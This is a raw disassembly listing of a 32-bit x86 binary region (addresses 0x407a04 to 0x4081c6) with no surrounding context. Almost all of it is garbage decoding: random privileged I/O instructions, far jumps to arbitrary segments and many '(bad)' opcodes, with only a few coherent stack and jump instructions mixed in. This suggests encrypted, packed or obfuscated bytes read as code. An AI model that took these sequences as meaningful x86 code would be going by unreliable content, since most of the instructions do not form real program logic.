  407a04:	and    bl,BYTE PTR [ebx+0x3a]
  407a07:	popf   
  407a08:	adc    al,0xf8
  407a0a:	aaa    
  407a0b:	cdq    
  407a0c:	das    
  407a0d:	inc    edi
  407a0e:	add    al,0x52
  407a10:	fst    DWORD PTR [edx+esi*4-0x18]
  407a14:	dec    edi
  407a15:	popf   
  407a16:	or     DWORD PTR [eax],edi
  407a18:	push   eax
  407a19:	in     eax,0x43
  407a1b:	std    
  407a1c:	shl    DWORD PTR [ebx],0x5a
  407a1f:	mov    dl,0x56
  407a21:	out    dx,al
  407a22:	cmp    ebx,edx
  407a24:	mov    ah,0xe4
  407a26:	test   eax,0x8a0f67d0
  407a2b:	adc    al,0xce
  407a2d:	ins    DWORD PTR es:[edi],dx
  407a2e:	adc    bl,al
  407a30:	and    ecx,DWORD PTR [edx+0x63e45455]
  407a36:	pop    edi
  407a37:	sub    esp,DWORD PTR [eax]
  407a39:	and    BYTE PTR [edi],0x1c
  407a3c:	aas    
  407a3d:	or     edx,esi
  407a3f:	mov    BYTE PTR [edx+0x1253aa4],bh
  407a45:	aas    
  407a46:	mov    ebp,0xf7198419
  407a4b:	mov    dl,0x97
  407a4d:	and    DWORD PTR [ecx+0x72],esi
  407a50:	pop    ss
  407a51:	aam    0x95
  407a53:	push   ecx
  407a54:	cld    
  407a55:	fldl2t 
  407a57:	lock xchg ebp,eax
  407a59:	jnp    0x407a1b
  407a5b:	xor    cl,BYTE PTR ds:0x5f6a4525
  407a61:	psrld  mm5,QWORD PTR [edi]
  407a64:	xchg   DWORD PTR [ebp+0x1],esp
  407a67:	daa    
  407a68:	gs mov cl,ah
  407a6b:	es das 
  407a6d:	add    esi,DWORD PTR [edx-0x2255379]
  407a73:	neg    BYTE PTR [edi-0x15]
  407a76:	fist   DWORD PTR [esi]
  407a78:	(bad)  
  407a79:	sahf   
  407a7a:	into   
  407a7b:	hlt    
  407a7c:	daa    
  407a7d:	xchg   esp,eax
  407a7e:	xchg   esp,eax
  407a7f:	loop   0x407ab2
  407a81:	ss test al,0xf2
  407a84:	std    
  407a85:	cli    
  407a86:	add    al,0x9a
  407a88:	mov    al,ds:0x137e43aa
  407a8d:	inc    DWORD PTR [eax]
  407a8f:	mov    ecx,0x6057737a
  407a94:	je     0x407aae
  407a96:	add    BYTE PTR [esi],cl
  407a98:	xchg   esi,eax
  407a99:	inc    BYTE PTR [edi-0x682debd1]
  407a9f:	outs   dx,BYTE PTR ds:[esi]
  407aa0:	adc    BYTE PTR [eax],dh
  407aa2:	cmp    dl,ah
  407aa4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407aa5:	call   0x87b377ab
  407aaa:	inc    ebp
  407aab:	(bad)  
  407aac:	or     dh,cl
  407aae:	retf   
  407aaf:	cs dec esi
  407ab1:	xor    al,0xba
  407ab3:	loope  0x407aed
  407ab5:	repnz aad 0x19
  407ab8:	jp     0x407b02
  407aba:	(bad)  
  407abc:	xchg   BYTE PTR ds:0x71d94efb,dl
  407ac2:	push   eax
  407ac3:	popa   
  407ac4:	adc    al,0x48
  407ac6:	dec    edi
  407ac7:	adc    al,0x6
  407ac9:	test   DWORD PTR [eax+0x50099b6e],esi
  407acf:	nop
  407ad0:	jb     0x407a58
  407ad2:	and    BYTE PTR [ecx+0x1c],ch
  407ad5:	test   BYTE PTR [eax+0x9fe9f6e],dl
  407adb:	ffreep st(7)
  407add:	add    eax,0x564fb0eb
  407ae2:	(bad)
  407ae6:	and    ch,al
  407ae8:	xchg   edi,eax
  407ae9:	(bad)  
  407aea:	jle    0x407b03
  407aec:	inc    ebx
  407aed:	lds    eax,FWORD PTR [eax+esi*8-0x27b6abc8]
  407af4:	push   esi
  407af5:	jmp    0x9bb4:0x4ec5e399
  407afc:	mov    DWORD PTR [ecx-0x5396a38f],ebx
  407b02:	pusha  
  407b03:	lahf   
  407b04:	cmp    DWORD PTR ds:0xb683bc60,ebx
  407b0a:	cmp    eax,DWORD PTR [edx+0x2]
  407b0d:	and    DWORD PTR [ebx+0x2e],ebx
  407b10:	mov    ecx,0x1bd9699f
  407b15:	xor    eax,esi
  407b17:	add    eax,edi
  407b19:	push   eax
  407b1a:	mov    eax,DWORD PTR [ebp-0x10]
  407b1d:	add    eax,0xaa
  407b22:	push   eax
  407b23:	mov    eax,DWORD PTR [ebp-0x10]
  407b26:	mov    eax,DWORD PTR [eax+0x198]
  407b2c:	push   DWORD PTR [eax]
  407b2e:	jmp    0x407e7b
  407b33:	sahf   
  407b34:	das    
  407b35:	or     ah,BYTE PTR [edi]
  407b37:	mov    DWORD PTR [ecx],esp
  407b39:	mov    cl,0xb5
  407b3b:	pop    es
  407b3c:	mov    BYTE PTR [ebx],bl
  407b3e:	(bad)  
  407b3f:	test   al,0xd6
  407b41:	xor    DWORD PTR [edi+0x57],0xffffffc9
  407b45:	jo     0x407bb7
  407b47:	and    BYTE PTR [ebp+0x70],bh
  407b4a:	jo     0x407ba8
  407b4c:	ret    
  407b4d:	call   0xcf6c:0xce70b9ad
  407b54:	stos   DWORD PTR es:[edi],eax
  407b55:	push   ebx
  407b56:	inc    edx
  407b57:	dec    ecx
  407b58:	outs   dx,DWORD PTR ds:[esi]
  407b59:	out    0xb8,al
  407b5b:	push   ds
  407b5c:	retf   
  407b5d:	cli    
  407b5e:	int    0x53
  407b60:	jo     0x407b8f
  407b62:	pop    eax
  407b63:	mov    al,0x17
  407b65:	cld    
  407b66:	jae    0x407b1f
  407b68:	add    ecx,DWORD PTR [edx-0x159be2cb]
  407b6e:	loop   0x407b6a
  407b70:	repz es push ds
  407b73:	jecxz  0x407b97
  407b75:	bt     DWORD PTR [esi],esp
  407b78:	out    dx,al
  407b79:	dec    esi
  407b7a:	div    edx
  407b7c:	mov    bh,0x9e
  407b7e:	jg     0x407b37
  407b80:	lea    ecx,[ebp+0x38]
  407b83:	jno    0x407bcf
  407b85:	inc    esp
  407b86:	or     bl,BYTE PTR [ecx]
  407b88:	mov    esp,0x51966e1d
  407b8d:	cmp    BYTE PTR [edx-0x5],dh
  407b90:	out    dx,al
  407b91:	or     ch,0xc7
  407b94:	sbb    edi,DWORD PTR [ecx+0x69]
  407b97:	adc    eax,0xe49d54f7
  407b9c:	jecxz  0x407bb5
  407b9e:	ins    BYTE PTR es:[edi],dx
  407b9f:	mov    ebx,0x6fb24b94
  407ba4:	inc    edx
  407ba5:	leave  
  407ba6:	gs aam 0xbe
  407ba9:	mov    bl,0xf9
  407bab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bac:	inc    esp
  407bad:	mov    esi,0x296acd96
  407bb2:	call   0x9422:0xecfce750
  407bb9:	cmp    cl,bh
  407bbb:	or     al,bh
  407bbd:	or     dl,BYTE PTR [eax+ecx*1+0x26]
  407bc1:	jo     0x407b8e
  407bc3:	(bad)  
  407bc4:	lock dec esp
  407bc6:	inc    ecx
  407bc7:	cld    
  407bc8:	cmp    eax,0xe29977fb
  407bcd:	shl    edi,1
  407bcf:	div    DWORD PTR [ebx-0x23]
  407bd2:	imul   edx,esp,0xffffffe6
  407bd5:	lahf   
  407bd6:	fwait
  407bd7:	pop    ds
  407bd8:	jl     0x407bda
  407bda:	psubd  mm3,QWORD PTR [esp+edx*4+0x1189b835]
  407be2:	mov    ch,0xa7
  407be4:	loope  0x407bb0
  407be6:	stc    
  407be7:	mov    edx,0x9eda94bb
  407bec:	inc    ebx
  407bed:	popf   
  407bee:	test   al,0xe9
  407bf0:	cwde   
  407bf1:	add    edi,ebx
  407bf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bf4:	push   ebp
  407bf5:	jae    0x407bd4
  407bf7:	jl     0x407c52
  407bf9:	add    dl,BYTE PTR [edx-0x12f50ea9]
  407bff:	push   ecx
  407c00:	fiadd  DWORD PTR [eax-0x4d]
  407c03:	and    al,0x5a
  407c05:	int3   
  407c06:	jle    0x407bcf
  407c08:	push   ebp
  407c09:	aad    0xae
  407c0b:	pop    eax
  407c0c:	(bad)
  407c0f:	clc    
  407c10:	std    
  407c11:	ins    DWORD PTR es:[edi],dx
  407c12:	pusha  
  407c13:	pop    es
  407c14:	inc    eax
  407c15:	fistp  QWORD PTR [ebx]
  407c17:	xchg   edx,eax
  407c18:	add    DWORD PTR [edi+ecx*8],esp
  407c1b:	dec    edi
  407c1c:	icebp  
  407c1d:	mov    bh,0x35
  407c1f:	jle    0x407bcf
  407c21:	cmp    al,0x73
  407c23:	pcmpgtw mm0,QWORD PTR [esi-0x352fd1c2]
  407c2a:	ds lock xchg edi,eax
  407c2d:	adc    DWORD PTR [ebp+0x21bdecaa],0x7f1586ae
  407c37:	cdq    
  407c38:	call   0x58992bf2
  407c3d:	cwde   
  407c3e:	pop    ebx
  407c3f:	xchg   esi,eax
  407c40:	jb     0x407c00
  407c42:	maxps  xmm4,xmm3
  407c45:	sbb    DWORD PTR [edx-0x109127f8],ebp
  407c4b:	bound  edx,QWORD PTR [edx-0x306d4958]
  407c51:	aad    0xad
  407c53:	ins    DWORD PTR es:[edi],dx
  407c54:	je     0x407c0f
  407c56:	push   ecx
  407c57:	js     0x407c88
  407c59:	mov    al,0xbe
  407c5b:	cmp    ah,BYTE PTR [edx-0x46]
  407c5e:	sub    ecx,DWORD PTR [ebx-0x3fb43041]
  407c64:	jno    0x407c59
  407c66:	ja     0x407bed
  407c68:	xor    DWORD PTR [eax-0x5a],0xffffffd8
  407c6c:	add    eax,0x6d6a9acd
  407c71:	sbb    eax,0xb85fe0e9
  407c76:	xchg   edi,eax
  407c77:	and    BYTE PTR [ebx+ebx*2-0x43],ch
  407c7b:	je     0x407c34
  407c7d:	pop    ecx
  407c7e:	sub    eax,0x93c62b91
  407c83:	mov    esi,?
  407c85:	jp     0x407c9e
  407c87:	cmp    al,BYTE PTR [edx-0x49]
  407c8a:	enter  0x6290,0x9
  407c8e:	or     al,0xeb
  407c90:	mov    al,0x87
  407c92:	dec    edx
  407c93:	out    dx,eax
  407c94:	ins    DWORD PTR es:[edi],dx
  407c95:	(bad)  
  407c97:	mov    DWORD PTR [eax-0x25],esi
  407c9a:	xchg   esi,eax
  407c9b:	call   0x190b0672
  407ca0:	inc    esp
  407ca1:	sub    ebp,edx
  407ca3:	ds jo  0x407c64
  407ca6:	pop    edi
  407ca7:	punpcklwd mm4,DWORD PTR [ebx]
  407caa:	sbb    eax,0xe766a31e
  407caf:	adc    edi,esi
  407cb1:	mov    dh,0x5c
  407cb3:	test   ecx,esp
  407cb5:	add    dl,BYTE PTR [esi+0x16]
  407cb8:	jmp    0xc0e9:0x755532b7
  407cbf:	call   0x4a4b:0xbde1c718
  407cc6:	clc    
  407cc7:	mov    bl,0xc6
  407cc9:	shr    DWORD PTR [ecx-0x7c],1
  407ccc:	in     al,0x81
  407cce:	ja     0x407cef
  407cd0:	rcl    DWORD PTR [edi-0x8],cl
  407cd3:	ins    BYTE PTR es:[edi],dx
  407cd4:	xor    esi,eax
  407cd6:	or     esi,DWORD PTR [ecx]
  407cd8:	mov    WORD PTR [edx-0x78],ss
  407cdb:	lea    ebp,[eax-0xe]
  407cde:	out    0x1e,al
  407ce0:	stc    
  407ce1:	cmp    cl,dh
  407ce3:	xchg   BYTE PTR [ecx],bl
  407ce5:	daa    
  407ce6:	lods   al,BYTE PTR ds:[esi]
  407ce7:	cmp    edx,eax
  407ce9:	jmp    0x5c5c5679
  407cee:	jg     0x407cfb
  407cf0:	lods   eax,DWORD PTR ds:[esi]
  407cf1:	adc    BYTE PTR [esi],cl
  407cf3:	bound  edi,QWORD PTR [ebx]
  407cf5:	push   esp
  407cf6:	stos   BYTE PTR es:[edi],al
  407cf7:	mov    BYTE PTR [eax-0x1e],ch
  407cfa:	mov    ah,BYTE PTR [esi]
  407cfc:	js     0x407d08
  407cfe:	mov    ebx,ss
  407d00:	dec    ecx
  407d01:	mov    ch,0x47
  407d03:	lahf   
  407d04:	rcr    BYTE PTR [esi+0x13a2fbca],0xb3
  407d0b:	and    dh,BYTE PTR [ebx]
  407d0d:	daa    
  407d0e:	mov    edi,gs
  407d10:	add    dh,BYTE PTR [edi+0x2aa99dba]
  407d16:	jg     0x407cf6
  407d18:	mov    ecx,0xc375ab38
  407d1d:	mov    ds:0x28de422c,al
  407d22:	fnstenv [edx]
  407d24:	(bad)  
  407d26:	ds sub al,0x3d
  407d29:	frndint 
  407d2b:	xchg   edi,eax
  407d2c:	cmp    bh,ch
  407d2e:	enter  0x3148,0xd8
  407d32:	mov    dh,0xf8
  407d34:	pop    edi
  407d35:	call   0x3df1:0xac950016
  407d3c:	rol    DWORD PTR [ebx+eax*1],0x2d
  407d40:	sub    eax,0xfb85aaa3
  407d45:	mov    ch,BYTE PTR [ebx]
  407d47:	test   eax,0xd143110c
  407d4c:	lea    esp,[edx]
  407d4e:	xchg   esp,eax
  407d4f:	icebp  
  407d50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d51:	push   ds
  407d52:	jl     0x407d2f
  407d54:	popf   
  407d55:	xchg   edi,eax
  407d56:	sub    edx,ebx
  407d58:	pop    esp
  407d59:	rcl    BYTE PTR [ebx+0x77a622b9],0x9a
  407d60:	or     eax,0x4d1c2424
  407d65:	lock icebp 
  407d67:	mov    ebx,0xbce2b926
  407d6c:	out    dx,eax
  407d6d:	inc    edi
  407d6e:	dec    edx
  407d6f:	jmp    0x407d13
  407d71:	pop    edx
  407d72:	push   ebp
  407d73:	push   eax
  407d74:	pop    ss
  407d75:	jo     0x407d83
  407d77:	mov    esp,0x9786c8
  407d7c:	mov    edi,DWORD PTR [ebx+ebp*8+0x3a]
  407d80:	out    0xe2,al
  407d82:	int3   
  407d83:	leave  
  407d84:	mov    al,ds:0x2f515c9f
  407d89:	xchg   esi,eax
  407d8a:	test   al,0x72
  407d8c:	lahf   
  407d8d:	mov    ds:0xe8ecd40c,al
  407d92:	(bad)  
  407d93:	ss inc esp
  407d95:	or     DWORD PTR [edi-0x36],ecx
  407d98:	push   eax
  407d99:	xlat   BYTE PTR ds:[ebx]
  407d9a:	jl     0x407d69
  407d9c:	dec    edx
  407d9d:	fisubr WORD PTR [ebp-0x30]
  407da0:	div    ah
  407da2:	ins    BYTE PTR es:[edi],dx
  407da3:	xchg   ecx,eax
  407da4:	pushf  
  407da5:	loopne 0x407dd5
  407da7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407da8:	or     al,0xf
  407daa:	inc    esi
  407dab:	js     0x407d49
  407dad:	je     0x407de1
  407daf:	push   cs
  407db0:	aam    0xc3
  407db2:	call   FWORD PTR [eax-0x5a]
  407db5:	test   DWORD PTR [ebx+0x79c15ad8],0xb5cad607
  407dbf:	and    DWORD PTR [ebx-0x3e],0x37a1dc79
  407dc6:	push   0x9569904b
  407dcb:	aas    
  407dcc:	jge    0x407e3f
  407dce:	dec    ecx
  407dcf:	retf   
  407dd0:	sbb    edx,DWORD PTR [esp+ecx*1]
  407dd3:	push   ds
  407dd4:	xlat   BYTE PTR ds:[ebx]
  407dd5:	in     al,dx
  407dd6:	cld    
  407dd7:	dec    edi
  407dd8:	mov    dh,0x6f
  407dda:	mov    al,ds:0xfd9d3ca0
  407ddf:	lods   eax,DWORD PTR ds:[esi]
  407de0:	add    eax,0x8a4a0448
  407de5:	int3   
  407de6:	dec    ebx
  407de7:	out    dx,eax
  407de8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407de9:	gs lahf 
  407deb:	xchg   ecx,eax
  407dec:	les    ecx,FWORD PTR [edi+0x115d7404]
  407df2:	cs daa 
  407df4:	inc    edx
  407df5:	std    
  407df6:	xchg   esi,eax
  407df7:	cmp    eax,0x8beb969f
  407dfc:	imul   esp,DWORD PTR [ebx],0xb9dad06c
  407e02:	test   BYTE PTR [edx],dl
  407e04:	jle    0x407e15
  407e06:	shl    DWORD PTR [eax],0xf9
  407e09:	or     ch,BYTE PTR [edx-0x4e7248c4]
  407e0f:	outs   dx,DWORD PTR ds:[esi]
  407e10:	ret    0x5ca1
  407e13:	jg     0x407d95
  407e15:	inc    edi
  407e16:	in     al,dx
  407e17:	shr    BYTE PTR [edi],0x92
  407e1a:	cli    
  407e1b:	and    dl,BYTE PTR [esi-0x39]
  407e1e:	sub    edx,DWORD PTR [esi]
  407e20:	mov    bl,0xdc
  407e22:	sahf   
  407e23:	jl     0x407dc2
  407e25:	push   ebp
  407e26:	xchg   esp,eax
  407e27:	lock jl 0x407db9
  407e2a:	mov    ebx,0x5653cc02
  407e2f:	loope  0x407df7
  407e31:	cmp    ebp,ebp
  407e33:	push   esp
  407e34:	retf   
  407e35:	push   cs
  407e36:	sub    DWORD PTR [esp+eax*2+0x7182ad64],ebp
  407e3d:	addr16 jns 0x407dc3
  407e40:	mov    ch,BYTE PTR [edi+edx*2-0x44343ac4]
  407e47:	ja     0x407dcd
  407e49:	loope  0x407dd5
  407e4b:	mov    ah,BYTE PTR [ebp+0x1c449556]
  407e51:	nop
  407e52:	push   ebx
  407e53:	scas   al,BYTE PTR es:[edi]
  407e54:	cmp    al,0x74
  407e56:	sub    DWORD PTR [ecx+0x2d],edi
  407e59:	aad    0x3f
  407e5b:	mov    dh,0x4f
  407e5d:	jge    0x407e6b
  407e5f:	or     BYTE PTR [ecx+eax*4-0x11],cl
  407e63:	ins    DWORD PTR es:[edi],dx
  407e64:	or     BYTE PTR [ecx+0x22],cl
  407e67:	pushf  
  407e68:	jecxz  0x407ec0
  407e6a:	pop    edi
  407e6b:	pop    es
  407e6c:	sub    al,0xc9
  407e6e:	fcomip st,st(7)
  407e70:	bound  esp,QWORD PTR [ebx]
  407e72:	jl     0x407e1e
  407e74:	mov    DWORD PTR [edx+ecx*8],eax
  407e77:	cmp    BYTE PTR [edi],bh
  407e79:	shl    ch,cl
  407e7b:	call   0x4120bb
  407e80:	mov    DWORD PTR [ebp-0x8],eax
  407e83:	cmp    DWORD PTR [ebp-0x8],0x0
  407e87:	jmp    0x4081d4
  407e8c:	in     eax,0xe6
  407e8e:	outs   dx,DWORD PTR ds:[esi]
  407e8f:	pop    ebp
  407e90:	outs   dx,DWORD PTR ds:[esi]
  407e91:	jne    0x407e88
  407e93:	data16 hlt 
  407e95:	test   ebx,eax
  407e97:	pushf  
  407e98:	hlt    
  407e99:	ror    DWORD PTR [esi+0x70d507a0],0x70
  407ea0:	and    BYTE PTR [ebp+0x70],bh
  407ea3:	jo     0x407ef5
  407ea5:	add    eax,0x7a457cb5
  407eaa:	push   edi
  407eab:	js     0x407e3c
  407ead:	push   0xdd276da9
  407eb2:	jne    0x407ec9
  407eb4:	int3   
  407eb5:	fcomp  DWORD PTR [ebx-0x693c722d]
  407ebb:	daa    
  407ebc:	and    bh,BYTE PTR [bx+si-0x1da2]
  407ec1:	es aaa 
  407ec3:	leave  
  407ec4:	dec    ecx
  407ec5:	and    BYTE PTR [ecx+0x4c3b7fd2],bh
  407ecb:	ror    BYTE PTR [esi],1
  407ecd:	and    al,0xef
  407ecf:	xlat   BYTE PTR ds:[ebx]
  407ed0:	mov    esp,0x66f3496d
  407ed5:	aaa    
  407ed6:	and    edx,esi
  407ed8:	sahf   
  407ed9:	push   esi
  407eda:	pop    esi
  407edb:	add    ah,0x4
  407ede:	(bad)  
  407edf:	das    
  407ee0:	inc    edi
  407ee1:	mov    dl,0xad
  407ee3:	gs and al,0x2e
  407ee6:	fsub   DWORD PTR [edx+0x2c2fe6c3]
  407eec:	ror    BYTE PTR gs:[ebp-0x12e3da8],cl
  407ef3:	sub    BYTE PTR [edx],ch
  407ef5:	clc    
  407ef6:	lods   eax,DWORD PTR ds:[esi]
  407ef7:	xchg   esp,eax
  407ef8:	retf   0x5dc
  407efb:	popf   
  407efc:	aam    0xb3
  407efe:	jb     0x407e81
  407f00:	sub    ebp,DWORD PTR [edi-0x9]
  407f03:	das    
  407f04:	call   0x703fee3e
  407f09:	push   ds
  407f0a:	mov    ds:0xd0ab724c,eax
  407f0f:	lock inc eax
  407f11:	xor    DWORD PTR [edx-0x17],ebp
  407f14:	adc    DWORD PTR [edi-0x7c],eax
  407f17:	ret    
  407f18:	mov    eax,ds:0x8e6ab0ef
  407f1d:	mov    ebx,0xffe3f204
  407f22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f23:	(bad)  
  407f24:	daa    
  407f25:	mov    ecx,0x602a0895
  407f2a:	push   0xb8ec8ff6
  407f2f:	call   0xfc3a8fd3
  407f34:	out    dx,al
  407f35:	hlt    
  407f36:	cli    
  407f37:	mov    bl,0x82
  407f39:	jno    0x407ef5
  407f3b:	and    BYTE PTR [edx+esi*2-0x30cf22d5],bh
  407f42:	and    BYTE PTR [esp+ebp*8+0x31],dh
  407f46:	in     al,dx
  407f47:	push   ds
  407f48:	push   esp
  407f49:	arpl   WORD PTR [ebx+0x27],cx
  407f4c:	lds    eax,FWORD PTR [ebx+0x6a]
  407f4f:	xchg   ebx,eax
  407f50:	ins    DWORD PTR es:[edi],dx
  407f51:	sub    edx,DWORD PTR [edi]
  407f53:	pop    edx
  407f54:	repz pop edx
  407f56:	cld    
  407f57:	push   ecx
  407f58:	push   ebx
  407f59:	pop    es
  407f5a:	inc    edx
  407f5b:	adc    edi,DWORD PTR [edi-0x4f3499fd]
  407f61:	dec    esp
  407f62:	js     0x407f98
  407f64:	js     0x407f41
  407f66:	pusha  
  407f67:	es xor edx,ecx
  407f6a:	and    al,0xe6
  407f6c:	es out 0x17,eax
  407f6f:	dec    ecx
  407f70:	loope  0x407fca
  407f72:	nop
  407f73:	bound  esp,QWORD PTR [ebx-0x67e810f8]
  407f79:	mov    eax,0x7c86f409
  407f7e:	js     0x407fc4
  407f80:	je     0x407f47
  407f82:	cmp    eax,0xa8e4d8ac
  407f87:	lods   eax,DWORD PTR ds:[esi]
  407f88:	nop
  407f89:	add    esp,ebx
  407f8b:	ret    
  407f8c:	retf   0x9d06
  407f8f:	pop    ebp
  407f90:	test   esi,esi
  407f92:	mov    eax,0x38f6ddbc
  407f97:	xchg   esi,eax
  407f98:	inc    ebx
  407f99:	xor    ecx,DWORD PTR [eax-0x6f33770e]
  407f9f:	jecxz  0x408002
  407fa1:	add    BYTE PTR [esi+0x68],al
  407fa4:	jmp    0xefc1:0xe63fd31c
  407fab:	popa   
  407fac:	cmp    eax,0x453f381a
  407fb1:	pop    es
  407fb2:	cwde   
  407fb3:	xchg   ebp,eax
  407fb4:	mov    dl,0x5f
  407fb6:	ror    BYTE PTR ds:0xdc8b55a2,cl
  407fbc:	cmp    eax,0x9bc73ed9
  407fc1:	sar    ebx,cl
  407fc3:	jg     0x407fa0
  407fc5:	adc    al,BYTE PTR [ebp-0x28091823]
  407fcb:	dec    edx
  407fcc:	fnsave [edi]
  407fce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fcf:	inc    eax
  407fd0:	int    0x7b
  407fd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407fd3:	adc    eax,0x7316954c
  407fd8:	push   ecx
  407fd9:	jle    0x408018
  407fdb:	lahf   
  407fdc:	int    0xed
  407fde:	fisttp QWORD PTR [edi+0x1b]
  407fe1:	cli    
  407fe2:	dec    esi
  407fe3:	nop
  407fe4:	out    0x4e,eax
  407fe6:	lock (bad) 
  407fe8:	not    DWORD PTR [ecx-0x193c6b01]
  407fee:	sti    
  407fef:	pushf  
  407ff0:	aaa    
  407ff1:	test   DWORD PTR [eax],0x7d072c78
  407ff7:	fisttp QWORD PTR [edi+0x36]
  407ffa:	adc    eax,0x5d7e0e11
  407fff:	and    bh,BYTE PTR [ebp+0x56]
  408002:	iret   
  408003:	sub    ch,BYTE PTR [ecx]
  408005:	iret   
  408006:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408007:	add    bh,BYTE PTR [ebp+0x1e]
  40800a:	push   esp
  40800b:	fnstsw WORD PTR [ebp+0x6b]
  40800e:	jmp    0x9a44:0x915a1b8c
  408015:	sub    bl,BYTE PTR [edi-0x37]
  408018:	(bad)  
  40801a:	mov    ebx,0xd97d40d0
  40801f:	sti    
  408020:	sbb    dh,BYTE PTR [ebp+0x86f3ea]
  408026:	pop    es
  408027:	dec    esi
  408028:	mov    esi,0x56e254ee
  40802d:	imul   esi,DWORD PTR [ecx+0x209b5282],0x934c0a0a
  408037:	xor    edi,eax
  408039:	sbb    dh,dl
  40803b:	shr    BYTE PTR [ecx+0x623ead3d],cl
  408041:	pop    esp
  408042:	hlt    
  408043:	jmp    0xb974:0x9faa8ad9
  40804a:	pop    ss
  40804b:	out    0xab,eax
  40804d:	mov    ah,0x45
  40804f:	rol    BYTE PTR [ebx],cl
  408051:	mov    ebp,DWORD PTR [esp+esi*2+0x23]
  408055:	leave  
  408056:	mov    bh,0xec
  408058:	sbb    esp,esi
  40805a:	pop    eax
  40805b:	icebp  
  40805c:	aam    0xe0
  40805e:	je     0x407ff2
  408060:	fbld   TBYTE PTR [edi]
  408062:	or     esi,DWORD PTR [ecx]
  408064:	or     eax,0x76fc7b5
  408069:	fidivr DWORD PTR [ebx]
  40806b:	(bad)  
  40806c:	les    edx,FWORD PTR [edi]
  40806e:	or     bh,al
  408070:	out    dx,al
  408071:	fidivr WORD PTR [ecx]
  408073:	adc    bl,BYTE PTR [edx-0x4312853a]
  408079:	pop    ecx
  40807a:	pop    ebp
  40807b:	(bad)  
  40807c:	pop    ss
  40807d:	dec    ecx
  40807e:	jecxz  0x4080b9
  408080:	mov    ebx,0xf1f9cea9
  408085:	call   DWORD PTR [ebp-0x6f]
  408088:	call   0x4a03:0x88c760d2
  40808f:	nop
  408090:	shl    DWORD PTR [ebp*2-0x37a3890a],1
  408097:	or     DWORD PTR [ebx+0x192bd8fa],0xecd3254d
  4080a1:	sbb    DWORD PTR [ecx+0x14],ecx
  4080a4:	mov    esi,0xe4de967d
  4080a9:	aaa    
  4080aa:	xchg   esi,eax
  4080ab:	es xor al,0x9d
  4080ae:	scas   eax,DWORD PTR es:[edi]
  4080af:	mov    ebx,DWORD PTR [ecx+0x67]
  4080b2:	cdq    
  4080b3:	xor    eax,0x6ee2b3fd
  4080b8:	ror    DWORD PTR [edx-0x2acd6d63],1
  4080be:	aaa    
  4080bf:	(bad)  
  4080c1:	(bad)  
  4080c2:	retf   0x25bc
  4080c5:	lock sub DWORD PTR cs:[esp+esi*8+0x64bf5b3],ebp
  4080ce:	nop
  4080cf:	loope  0x408116
  4080d1:	mov    DWORD PTR [eax-0x3c55b543],0x34311f0a
  4080db:	add    ch,dl
  4080dd:	push   esp
  4080de:	test   eax,0x4970f738
  4080e3:	test   al,0x64
  4080e5:	bound  esp,QWORD PTR [edx+ecx*1]
  4080e8:	xchg   ecx,eax
  4080e9:	jbe    0x4080a6
  4080eb:	add    esi,ebp
  4080ed:	xchg   ebp,ecx
  4080ef:	(bad)  
  4080f0:	in     al,0x38
  4080f2:	mov    eax,0x7bfffaeb
  4080f7:	fild   DWORD PTR [ebx+0x2f]
  4080fa:	cmp    DWORD PTR [edx-0x36076aa3],ebx
  408100:	cdq    
  408101:	and    BYTE PTR [eax],bh
  408103:	sbb    al,0xe5
  408105:	loope  0x408180
  408107:	push   ss
  408108:	push   ds
  408109:	(bad)  es:[eax]
  40810c:	mov    DWORD PTR [eax],ebx
  40810e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40810f:	mov    ebp,0xbdfa7dc9
  408114:	and    BYTE PTR [eax-0x27],0xc4
  408118:	or     cl,dl
  40811a:	inc    edx
  40811b:	lods   al,BYTE PTR ds:[esi]
  40811c:	mov    edi,0xc1db4e40
  408121:	push   0x52d061ba
  408126:	test   dh,cl
  408128:	mov    edi,0x13c19848
  40812d:	fcmovb st,st(2)
  40812f:	add    eax,0x97bb7f26
  408134:	lahf   
  408135:	mov    bl,0x69
  408137:	and    al,0xaa
  408139:	sbb    edi,DWORD PTR [ebx+0x71200040]
  40813f:	cmc    
  408140:	add    al,0x20
  408142:	dec    esi
  408143:	pop    esp
  408144:	mov    eax,0xf73993cf
  408149:	test   BYTE PTR [ecx],ah
  40814b:	test   DWORD PTR [ebx+0x7e],esp
  40814e:	stc    
  40814f:	sbb    eax,0x635ac391
  408154:	aam    0x10
  408156:	cmp    al,0x9d
  408158:	rcl    DWORD PTR [ecx+0x52],1
  40815b:	cdq    
  40815c:	arpl   WORD PTR [ecx-0x2d],si
  40815f:	and    bl,bl
  408161:	shl    DWORD PTR [ecx+edx*2+0x58868d1f],cl
  408168:	push   ds
  408169:	lods   al,BYTE PTR ds:[esi]
  40816a:	mov    eax,ds:0x537cb7af
  40816f:	sbb    eax,0xf21a323d
  408174:	clc    
  408175:	cli    
  408176:	sbb    eax,0x4b272316
  40817b:	jb     0x408175
  40817d:	pushf  
  40817e:	pop    ds
  40817f:	mov    ecx,0xbbfa33c8
  408184:	jp     0x4081b4
  408186:	lods   al,BYTE PTR ds:[esi]
  408187:	in     al,dx
  408188:	test   eax,0x85a37a0d
  40818d:	mov    ah,0xb
  40818f:	sub    eax,0x91f3629e
  408194:	and    esp,edx
  408196:	xchg   BYTE PTR [edx-0x17],ch
  408199:	xchg   ebx,eax
  40819a:	pop    esi
  40819b:	mov    ecx,0x546b6f5d
  4081a0:	jbe    0x40816c
  4081a2:	xor    edx,DWORD PTR [edi-0x1a41e14e]
  4081a8:	sbb    esi,DWORD PTR [edi+eiz*8+0x39e2f9dd]
  4081af:	jp     0x4081b5
  4081b1:	pop    edx
  4081b2:	push   0x4e
  4081b4:	iret   
  4081b5:	fcom   st(5)
  4081b7:	mov    esp,0x8db5a10
  4081bc:	scas   al,BYTE PTR es:[edi]
  4081bd:	push   esi
  4081be:	pop    edx
  4081bf:	jmp    0xab5b:0x1bca5201
  4081c6:	mov    eax,0x91579867
